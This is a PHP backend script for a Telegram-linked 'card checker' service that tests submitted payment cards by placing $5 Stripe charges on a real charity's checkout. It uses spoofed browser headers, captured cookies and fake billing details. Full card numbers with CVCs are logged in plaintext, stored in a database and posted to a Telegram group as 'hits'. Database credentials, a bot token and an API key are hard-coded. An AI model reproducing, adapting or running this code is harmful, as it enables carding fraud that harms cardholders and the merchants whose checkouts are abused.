<?php
// Check if this is a GET request and show the HTML page immediately
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    header('Content-Type: text/html; charset=utf-8');
    http_response_code(403);
    
    echo '<html style="height:100%"> 
          <head> 
          <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /> 
          <title> 403 Forbidden </title>
          <style>@media (prefers-color-scheme:dark){body{background-color:#000!important}}</style>
          </head> 
          <body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;"> 
          <div style="height:auto; min-height:100%; "> 
          <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;"> 
          <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1> 
          <h2 style="margin-top:20px;font-size: 30px;">Forbidden </h2> 
          <p>Access to this resource on the server is denied!</p> 
          </div></div></body></html>';
    
    exit;
}

header('Content-Type: application/json');

// Enable error logging
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/paypal0.1$_debug.log');

// --- MOVED log_message function to the top to prevent 500 errors ---
// Optional file-based logging for debugging
 $log_file = __DIR__ . '/paypal0.1$_debug.log';
function log_message($message) {
    global $log_file;
    $timestamp = date('Y-m-d H:i:s');
    // Ensure the message is a string
    $log_entry = is_array($message) || is_object($message) ? json_encode($message) : $message;
    file_put_contents($log_file, "$timestamp - $log_entry\n", FILE_APPEND);
}

// --- PROXY DETECTION LOGIC - MOVED TO TOP FOR ALL REQUESTS ---

// Function to get the real user IP address
function getUserIP() {
    $ip_keys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'REMOTE_ADDR'];
    foreach ($ip_keys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
        }
    }
    return isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '127.0.0.1';
}

// Function to check if IP is a proxy
function checkProxyIP($ip) {
    // Check if cURL is available
    if (!function_exists('curl_init')) {
        log_message("cURL extension is not installed. Cannot perform proxy check.");
        return false; // Fail open (allow access) if we can't check
    }

    $api_url = "https://api.isproxyip.com/v1/check.php?key=zHwDyAMU6bJMIHCKfcDGnjMi7zq3S743dQXWBoqKNPCPEW4z94&ip=" . urlencode($ip) . "&format=json";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // 10-second timeout
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($error) {
        log_message("Proxy check CURL error for IP $ip: $error");
        return false; // Fail open on error
    }
    
    if ($http_code !== 200) {
        log_message("Proxy check HTTP error for IP $ip: Status Code $http_code. Response: $response");
        return false; // Fail open on error
    }
    
    $data = json_decode($response, true);
    if (json_last_error() !== JSON_ERROR_NONE || !isset($data['proxy'])) {
        log_message("Proxy check JSON decode error or missing 'proxy' key for IP $ip. Response: $response");
        return false; // Fail open on error
    }
    
    // Log the proxy check result
    log_message("Proxy check result for IP $ip: " . json_encode($data));
    
    // Return true if proxy is detected (value > 0)
    return (int)$data['proxy'] > 0;
}

// Function to display simple 403 Forbidden page
function showForbiddenPage() {
    // Reset content type to HTML
    header('Content-Type: text/html; charset=utf-8');
    http_response_code(403);
    
    echo '<html style="height:100%"> 
          <head> 
          <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /> 
          <title> 403 Forbidden </title>
          <style>@media (prefers-color-scheme:dark){body{background-color:#000!important}}</style>
          </head> 
          <body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;"> 
          <div style="height:auto; min-height:100%; "> 
          <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;"> 
          <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1> 
          <h2 style="margin-top:20px;font-size: 30px;">Forbidden </h2> 
          <p>Access to this resource on the server is denied!</p> 
          </div></div></body></html>';
    
    exit; // Ensure script execution stops completely
}

// Get user's IP address and check for proxy - FOR ALL REQUESTS
 $user_ip = getUserIP();
log_message("Request received from IP: $user_ip");

if (checkProxyIP($user_ip)) {
    log_message("ACCESS DENIED - Proxy detected for IP: $user_ip");
    showForbiddenPage();
    exit; // Double ensure script execution stops
}

// --- END OF PROXY DETECTION LOGIC ---

// === DATABASE CONNECTION ===
 $databaseUrl = 'postgresql://card_chk_db_user:Zm2zF0tYtCDNBfaxh46MPPhC0wrB5j4R@dpg-d3l08pmr433s738hj84g-a.oregon-postgres.render.com/card_chk_db';

try {
    $dbUrl = parse_url($databaseUrl);
    $host = $dbUrl['host'] ?? null;
    $port = $dbUrl['port'] ?? 5432;
    $user = $dbUrl['user'] ?? null;
    $pass = $dbUrl['pass'] ?? null;
    $path = $dbUrl['path'] ?? null;

    if (!$host || !$user || !$pass || !$path) {
        throw new Exception("Missing DB connection parameters");
    }

    $dbName = ltrim($path, '/');
    
    // Set connection timeout with extended options and SSL mode
    $pdo = new PDO(
        "pgsql:host=$host;port=$port;dbname=$dbName;sslmode=require",
        $user,
        $pass,
        [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_TIMEOUT => 15,
            PDO::ATTR_PERSISTENT => false,
            PDO::ATTR_EMULATE_PREPARES => false
        ]
    );
    
    // Store the database connection in a global variable for use in recordCardCheck
    $GLOBALS['pdo'] = $pdo;
    
    // === TABLE SETUP ===
    // Check if card_checks table exists
    $tableExists = $pdo->query("SELECT to_regclass('public.card_checks')")->fetchColumn();
    
    if (!$tableExists) {
        // Create card_checks table if it doesn't exist
        $pdo->exec("
            CREATE TABLE card_checks (
                id SERIAL PRIMARY KEY,
                user_id BIGINT,
                card_number VARCHAR(255),
                status VARCHAR(50),
                response TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        ");
        log_message("Created card_checks table");
    }
    
    // Check if users table exists
    $usersTableExists = $pdo->query("SELECT to_regclass('public.users')")->fetchColumn();
    
    if (!$usersTableExists) {
        // Create users table if it doesn't exist
        $pdo->exec("
            CREATE TABLE users (
                id SERIAL PRIMARY KEY,
                telegram_id BIGINT UNIQUE,
                name VARCHAR(255),
                username VARCHAR(255),
                photo_url VARCHAR(255),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        ");
        log_message("Created users table");
    } else {
        // Check if username column exists in users table
        $columnExists = $pdo->query("
            SELECT column_name 
            FROM information_schema.columns 
            WHERE table_name = 'users' AND column_name = 'username'
        ")->fetchColumn();
        
        // Add username column if it doesn't exist
        if (!$columnExists) {
            $pdo->exec("ALTER TABLE users ADD COLUMN username VARCHAR(255)");
            log_message("Added username column to users table");
        }
        
        // Check if photo_url column exists in users table
        $photoColumnExists = $pdo->query("
            SELECT column_name 
            FROM information_schema.columns 
            WHERE table_name = 'users' AND column_name = 'photo_url'
        ")->fetchColumn();
        
        // Add photo_url column if it doesn't exist
        if (!$photoColumnExists) {
            $pdo->exec("ALTER TABLE users ADD COLUMN photo_url VARCHAR(255)");
            log_message("Added photo_url column to users table");
        }
    }
    
    // Check if user_stats table exists, create if not
    $statsTableExists = $pdo->query("SELECT to_regclass('public.user_stats')")->fetchColumn();
    if (!$statsTableExists) {
        $pdo->exec("
            CREATE TABLE user_stats (
                id SERIAL PRIMARY KEY,
                user_id INTEGER REFERENCES users(id) ON DELETE CASCADE,
                hits INTEGER DEFAULT 0,
                last_hit TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        ");
        log_message("Created user_stats table");
    }
    
} catch (PDOException $e) {
    error_log("Database PDO Error in stripe5$.php: " . $e->getMessage());
    echo json_encode(['status' => 'ERROR', 'message' => 'Database connection error']);
    exit;
} catch (Exception $e) {
    error_log("General Error in stripe5$.php: " . $e->getMessage());
    echo json_encode(['status' => 'ERROR', 'message' => 'Server error']);
    exit;
}

// Start session for user authentication
session_start([
    'cookie_secure' => isset($_SERVER['HTTPS']),
    'cookie_httponly' => true,
    'use_strict_mode' => true,
]);

// Check if user is authenticated
if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Forbidden Access', 'response' => 'Forbidden Access'];
    log_message('Error 401: ' . json_encode($errorMsg));
    echo json_encode($errorMsg);
    exit;
}

// Enable error reporting for debugging (disable in production)
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Track sent notifications to prevent duplicates
 $sent_notifications = [];

// Function to check for 3DS responses
function is3DAuthenticationResponse($response) {
    $responseUpper = strtoupper($response);
    return strpos($responseUpper, '3D_AUTHENTICATION') !== false ||
           strpos($responseUpper, '3DS') !== false ||
           strpos($responseUpper, 'THREE_D_SECURE') !== false ||
           strpos($responseUpper, 'REDIRECT') !== false ||
           strpos($responseUpper, 'VERIFICATION_REQUIRED') !== false ||
           strpos($responseUpper, 'ADDITIONAL_AUTHENTICATION') !== false ||
           strpos($responseUpper, 'AUTHENTICATION_REQUIRED') !== false ||
           strpos($responseUpper, 'CHALLENGE_REQUIRED') !== false;
}

// Function to format response (remove status prefix and brackets)
function formatResponse($response) {
    $statusPrefixPattern = '/^(APPROVED|CHARGED|DECLINED|3DS)\s*\[(.*)\]$/i';
    if (preg_match($statusPrefixPattern, $response, $match)) {
        return $match[2];
    }
    $bracketsPattern = '/^\[(.*)\]$/';
    if (preg_match($bracketsPattern, $response, $match)) {
        return $match[1];
    }
    return $response;
}

// Function to send Telegram notification
function sendTelegramNotification($card_details, $status, $response, $originalApiResponse = null) {
    global $sent_notifications;
    
    try {
        // Create a unique key for this card to prevent duplicates
        $notification_key = md5($card_details . $status . $response);
        
        // Check if we've already sent this notification
        if (isset($sent_notifications[$notification_key])) {
            log_message("Skipping duplicate notification for $card_details: $status");
            return;
        }
        
        // Mark this notification as sent
        $sent_notifications[$notification_key] = true;
        
        // Check both formatted response and original API response for 3DS
        $checkResponse = $originalApiResponse ? $originalApiResponse : $response;
        if (is3DAuthenticationResponse($checkResponse)) {
            log_message("Skipping Telegram notification for 3DS response: $checkResponse");
            return;
        }
        
        // Only proceed if status is CHARGED or APPROVED
        if ($status !== 'CHARGED' && $status !== 'APPROVED') {
            log_message("Skipping notification - status is not CHARGED or APPROVED: $status");
            return;
        }

        // Load Telegram Bot Token from environment (secure storage)
        $bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: '8421537809:AAEfYzNtCmDviAMZXzxYt6juHbzaZGzZb6A'; // Replace with actual token in env
        $chat_id = '-1003204998888'; // Your group chat ID
        $group_link = 'https://t.me/+zkYtLxcu7QYxODg1';
        $site_link = 'https://cxchk.site';

        // Get user info from session
        $user_name = htmlspecialchars($_SESSION['user']['name'] ?? 'CardxChk User', ENT_QUOTES, 'UTF-8');
        $user_username = htmlspecialchars($_SESSION['user']['username'] ?? '', ENT_QUOTES, 'UTF-8');
        $user_profile_url = $user_username ? "https://t.me/" . str_replace('@', '', $user_username) : '#';
        $status_emoji = ($status === 'CHARGED') ? '🔥' : '✅';
        $gateway = 'Stripe 5$'; // Updated for this gateway
        $formatted_response = formatResponse($response);

        // Construct Telegram message
        $message = "<b>✦━━[ 𝐇𝐈𝐓 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃! ]━━✦</b>\n" .
                   "<a href=\"$group_link\">[⌇]</a> 𝐔𝐬𝐞𝐫 ➳ <a href=\"$user_profile_url\">$user_name</a>\n" .
                   "<a href=\"$group_link\">[⌇]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <b>$status $status_emoji</b>\n" .
                   "<a href=\"$group_link\">[⌇]</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ $gateway</b>\n" .
                   "<a href=\"$group_link\">[⌇]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>$formatted_response</i>\n" .
                   "<b>――――――――――――</b>\n" .
                   "<a href=\"$group_link\">[⌇]</a> 𝐇𝐈𝐓 𝐕𝐈𝐀 ➳ <a href=\"$site_link\">𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲</a>";

        // Send to Telegram
        $telegram_url = "https://api.telegram.org/bot$bot_token/sendMessage";
        $payload = [
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'HTML',
            'disable_web_page_preview' => true
        ];

        $ch = curl_init($telegram_url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $result = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curl_error = curl_error($ch);
        curl_close($ch);

        if ($http_code !== 200 || !$result) {
            log_message("Failed to send Telegram notification for $card_details: HTTP $http_code, Error: $curl_error, Response: " . ($result ?: 'No response'));
        } else {
            log_message("Telegram notification sent for $card_details: $status [$formatted_response]");
        }
    } catch (Exception $e) {
        log_message("Error in sendTelegramNotification: " . $e->getMessage());
    }
}

// Function to record card check in database and update user stats
function recordCardCheck($pdo, $card_number, $status, $response) {
    try {
        // Get or create user
        $userId = null;
        if (isset($_SESSION['user']['telegram_id'])) {
            // Check if user exists
            $stmt = $pdo->prepare("SELECT id FROM users WHERE telegram_id = ?");
            $stmt->execute([$_SESSION['user']['telegram_id']]);
            $user = $stmt->fetch(PDO::FETCH_ASSOC);
            
            if ($user) {
                $userId = $user['id'];
            } else {
                // Create new user
                $stmt = $pdo->prepare("
                    INSERT INTO users (telegram_id, name, username, photo_url) 
                    VALUES (?, ?, ?, ?)
                    RETURNING id
                ");
                $stmt->execute([
                    $_SESSION['user']['telegram_id'],
                    $_SESSION['user']['name'] ?? 'Unknown User',
                    $_SESSION['user']['username'] ?? '',
                    $_SESSION['user']['photo_url'] ?? ''
                ]);
                $userId = $pdo->lastInsertId();
            }
        }
        
        // Record the card check in the database
        $stmt = $pdo->prepare("INSERT INTO card_checks (user_id, card_number, status, response, created_at) VALUES (?, ?, ?, ?, NOW())");
        $stmt->execute([$userId, $card_number, $status, $response]);
        
        // If this is a hit (APPROVED or CHARGED), update user stats
        if ($status === 'APPROVED' || $status === 'CHARGED') {
            try {
                // Check if user stats record exists
                $stmt = $pdo->prepare("SELECT id FROM user_stats WHERE user_id = ?");
                $stmt->execute([$userId]);
                $statsRecord = $stmt->fetch(PDO::FETCH_ASSOC);
                
                if ($statsRecord) {
                    // Update existing record
                    $stmt = $pdo->prepare("UPDATE user_stats SET hits = hits + 1, last_hit = NOW() WHERE user_id = ?");
                    $stmt->execute([$userId]);
                } else {
                    // Create new record
                    $stmt = $pdo->prepare("INSERT INTO user_stats (user_id, hits, last_hit) VALUES (?, 1, NOW())");
                    $stmt->execute([$userId]);
                }
                
                log_message("Updated user stats for user ID $userId: incrementing hits count for $status card");
            } catch (PDOException $e) {
                log_message("Error updating user stats: " . $e->getMessage());
                // Continue execution even if stats update fails
            }
        }
    } catch (PDOException $e) {
        log_message("Database error in recordCardCheck: " . $e->getMessage());
    } catch (Exception $e) {
        log_message("General error in recordCardCheck: " . $e->getMessage());
    }
}

// Check if card details are provided
if (!isset($_POST['card']) || !is_array($_POST['card'])) {
    echo json_encode(['status' => 'ERROR', 'message' => 'Card details not provided']);
    exit;
}

// Get card details from POST request
 $cardNumber = $_POST['card']['number'] ?? '';
 $expMonth = $_POST['card']['exp_month'] ?? '';
 $expYear = $_POST['card']['exp_year'] ?? '';
 $cvc = $_POST['card']['cvc'] ?? '';

// Validate card details
if (empty($cardNumber) || empty($expMonth) || empty($expYear) || empty($cvc)) {
    $errorMsg = ['status' => 'DECLINED', 'message' => 'Missing card details', 'response' => 'MISSING_CARD_DETAILS'];
    log_message('Error 400: ' . json_encode($errorMsg));
    
    // Record the card check result in the database
    recordCardCheck($GLOBALS['pdo'], $cardNumber, 'DECLINED', 'Missing card details');
    
    echo json_encode($errorMsg);
    exit;
}

// Format year to 4 digits if needed
if (strlen($expYear) == 2) {
    $expYear = '20' . $expYear;
}

// Log request details
 $logMsg = 'Request: Card=' . $cardNumber . '|' . $expMonth . '|' . $expYear . '|' . $cvc . ', Headers=' . print_r(getallheaders(), true);
log_message($logMsg);

// First API call to create payment method
 $headers = [
    'authority: api.stripe.com',
    'accept: application/json',
    'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
];

 $data = 'billing_details[address][city]=Oakford&billing_details[address][country]=US&billing_details[address][line1]=Siles+Avenue&billing_details[address][line2]=&billing_details[address][postal_code]=19053&billing_details[address][state]=PA&billing_details[name]=Geroge+Washintonne&billing_details[email]=grogeh%40gmail.com&type=card&card[number]=' . $cardNumber . '&card[cvc]=' . $cvc . '&card[exp_year]=' . $expYear . '&card[exp_month]=' . $expMonth . '&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F5445b56991%3B+stripe-js-v3%2F5445b56991%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.onamissionkc.org&time_on_page=145592&client_attribution_metadata[client_session_id]=22e7d0ec-db3e-4724-98d2-a1985fc4472a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=7904f40e-9588-48b2-bc6b-fb88e0ef71d5&guid=18f2ab46-3a90-48da-9a6e-2db7d67a3b1de3eadd&muid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48&sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67&key=pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e&_stripe_account=acct_1LwocDFHMGxIu0Ep';

 $ch = curl_init('https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
 $response = curl_exec($ch);
 $apx = json_decode($response, true);
 $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode != 200 || !isset($apx['id'])) {
    $errorMsg = $apx['error']['message'] ?? 'Unknown error';
    $responseMsg = [
        'status' => 'DECLINED', 
        'message' => $errorMsg,
        'response' => $errorMsg
    ];
    log_message('Payment Method Error: ' . json_encode($responseMsg));
    
    // Record the card check result in the database
    recordCardCheck($GLOBALS['pdo'], $cardNumber, 'DECLINED', $errorMsg);
    
    echo json_encode($responseMsg);
    exit;
}

 $pid = $apx["id"];

// Second API call to merchant
 $cookies = 'crumb=BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1; ' .
           'ss_cvr=b5544939-8b08-4377-bd39-dfc7822c1376|1760724937850|1760724937850|1760724937850|1; ' .
           'ss_cvt=1760724937850; ' .
           '__stripe_mid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48; ' .
           '__stripe_sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67';

 $headers = [
    'authority: www.onamissionkc.org',
    'accept: application/json, text/plain, */*',
    'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
    'content-type: application/json',
    'origin: https://www.onamissionkc.org',
    'referer: https://www.onamissionkc.org/checkout?cartToken=C-S355dYaf3b2JVjp47gllJeLuFgNfZLk4-GJHK7',
    'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'x-csrf-token: BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1',
];

 $jsonData = json_encode([
    'email' => 'grogeh@gmail.com',
    'subscribeToList' => false,
    'shippingAddress' => [
        'id' => '',
        'firstName' => '',
        'lastName' => '',
        'line1' => '',
        'line2' => '',
        'city' => '',
        'region' => 'NY',
        'postalCode' => '',
        'country' => '',
        'phoneNumber' => '',
    ],
    'createNewUser' => false,
    'newUserPassword' => null,
    'saveShippingAddress' => false,
    'makeDefaultShippingAddress' => false,
    'customFormData' => null,
    'shippingAddressId' => null,
    'proposedAmountDue' => [
        'decimalValue' => '5', // Changed from '1' to '5'
        'currencyCode' => 'USD',
    ],
    'cartToken' => 'C-S355dYaf3b2JVjp47gllJeLuFgNfZLk4-GJHK7',
    'paymentToken' => [
        'stripePaymentTokenType' => 'PAYMENT_METHOD_ID',
        'token' => $pid,
        'type' => 'STRIPE',
    ],
    'billToShippingAddress' => false,
    'billingAddress' => [
        'id' => '',
        'firstName' => 'Davide',
        'lastName' => 'Washintonne',
        'line1' => 'Siles Avenue',
        'line2' => '',
        'city' => 'Oakford',
        'region' => 'PA',
        'postalCode' => '19053',
        'country' => 'US',
        'phoneNumber' => '+1361643646',
    ],
    'savePaymentInfo' => false,
    'makeDefaultPayment' => false,
    'paymentCardId' => null,
    'universalPaymentElementEnabled' => true,
]);

 $ch = curl_init('https://www.onamissionkc.org/api/2/commerce/orders');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
curl_setopt($ch, CURLOPT_COOKIE, $cookies);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
 $response1 = curl_exec($ch);
 $apx1 = json_decode($response1, true);
 $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if (isset($apx1["failureType"])) {
    $apl = $apx1["failureType"];
    $responseMsg = [
        'status' => 'DECLINED',
        'message' => 'Your card was declined',
        'response' => $apl
    ];
    log_message('Payment Declined: ' . json_encode($responseMsg));
    
    // Record the card check result in the database
    recordCardCheck($GLOBALS['pdo'], $cardNumber, 'DECLINED', $apl);
    
    echo json_encode($responseMsg);
} else {
    $responseMsg = [
        'status' => 'CHARGED',
        'message' => 'Your card has been charged $5.00 successfully.', // Changed from $1 to $5
        'response' => 'CHARGED'
    ];
    log_message('Payment Successful: ' . json_encode($responseMsg));
    
    // Record the card check result in the database
    recordCardCheck($GLOBALS['pdo'], $cardNumber, 'CHARGED', 'Your card has been charged $5.00 successfully.');
    
    // Send Telegram notification for CHARGED status
    $card_details = "$cardNumber|$expMonth|$expYear|$cvc";
    sendTelegramNotification($card_details, 'CHARGED', $responseMsg['response']);
    
    echo json_encode($responseMsg);
}
?>
